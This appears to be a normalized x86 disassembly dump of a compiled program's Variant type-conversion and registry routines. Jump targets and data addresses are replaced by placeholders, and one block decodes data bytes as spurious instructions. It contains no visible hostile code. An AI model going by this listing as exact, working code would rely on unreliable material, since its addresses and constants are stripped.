mov eax ebx
call sub_4047bc
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404218
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407a6c
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4047bc
jmp r-xdata
jmp r-xdata
call sub_40e048
sub_40ebac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ec6b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ec49
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40e3ec
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404780
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40486c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404218
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ec50
lea eax [ ebp - 0x10 ]
call sub_40e70c
retn
sub_40ec78
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ecce
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40ea34
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40ed60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ecd5
lea eax [ ebp - 0x10 ]
call sub_40e70c
retn
sub_40ecdc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4100f8
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ed51
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403fe4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e70c
retn
sub_40ed60
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f297
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40ed99 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403fe4
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403f90
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407d54
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403fe4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407d54
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403fe4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409130
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403fe4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409130
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403fe4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40ea78
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404218
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40eab0
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404218
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404780
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40486c
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404218
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_40eae8
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404218
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407d54
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403fe4
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407d54
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403fe4
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407d54
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403fe4
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_407e40
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403fe4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_407e40
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403fe4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40ed60
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ebac
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403fe4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f29e
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403fb4
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404688
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403fb4
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404688
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fb4
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40ec78
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403fe4
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403fe4
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40dfac
test ah 0x40
je r-xdata
mov eax esi
call sub_403f90
mov edx eax
mov eax ebx
call sub_40ecdc
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40ebac
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403fe4
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40ebac
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403fe4
jmp r-xdata
jmp [ eax * 4 + jump_table_40f02d ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d54
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403fe4
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407d54
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403fe4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409130
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403fe4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_409130
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403fe4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40ea78
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404218
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40eab0
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404218
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4041b8
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40eae8
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404218
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d54
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403fe4
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d54
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403fe4
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d54
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403fe4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_407e40
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403fe4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_407e40
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403fe4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40ed60
jmp r-xdata
sub_40f2a4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f34e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f331
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40e3ec
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404780
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40486c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f338
lea eax [ ebp - 0x10 ]
call sub_40e70c
retn
sub_40f35c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f3b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40ea34
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f488
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f3b9
lea eax [ ebp - 0x10 ]
call sub_40e70c
retn
sub_40f3c0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40f478
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4100f8
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f47f
lea eax [ ebp - 0x20 ]
call sub_404670
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f45b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404780
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40486c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e70c
retn
sub_40f488
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f9da
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f4c2 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4047bc
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404670
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407d54
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4047bc
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407d54
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4047bc
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409130
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047bc
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409130
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4047bc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40ea78
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4046ac
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40eab0
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4046ac
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404780
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40486c
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40eae8
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4046ac
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407d54
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4047bc
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407d54
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4047bc
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407d54
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4047bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_407e40
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4047bc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_407e40
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4047bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f488
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40f2a4
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4046ac
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f9e1
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404688
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403fb4
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404688
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403fb4
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404688
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403fb4
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404688
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fb4
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f35c
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4046ac
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4047bc
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40dfac
test ah 0x40
je r-xdata
mov eax esi
call sub_404670
mov edx eax
mov eax ebx
call sub_40f3c0
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f2a4
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4046ac
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40f2a4
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4046ac
jmp r-xdata
jmp [ eax * 4 + jump_table_40f749 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d54
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4047bc
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407d54
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4047bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409130
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4047bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409130
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4047bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40ea78
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4046ac
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40eab0
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4046ac
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404780
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40eae8
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4046ac
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d54
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4047bc
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d54
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4047bc
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d54
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4047bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_407e40
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4047bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_407e40
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4047bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f488
jmp r-xdata
sub_40f9e8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40e690
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_40fa24
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40e690
sub_40fa50
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40e690
sub_40fab4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403fe4
pop esi
pop ebx
retn
mov eax ebx
call sub_40e690
sub_40fae0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_40486c
pop esi
pop ebx
retn
mov eax ebx
call sub_40e690
sub_40fc9c
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40fdc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403fe4
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403fe4
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4100f8
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403fe4
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_40429c
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_407e68
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_40429c
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031a8
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402854
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4041f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fdc9
lea eax [ ebp - 0x208 ]
call sub_403f90
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_40429c
sub_40fe48
add [ eax ] cl
push esi
popad
jb r-xdata
cmp bh bh
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_4100f8
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_410078
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40fe54
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_40feb5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404d58
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40febc
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403258
sub_40ff04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_410078
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_4100f8
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_40ff58
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40ff90
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_410078
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40ffcc
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035cc
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41002f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410036
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4100d0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40330c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4100f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4101a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404d58
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_4101b0
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_410286
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_410269
push [ fs : eax ]
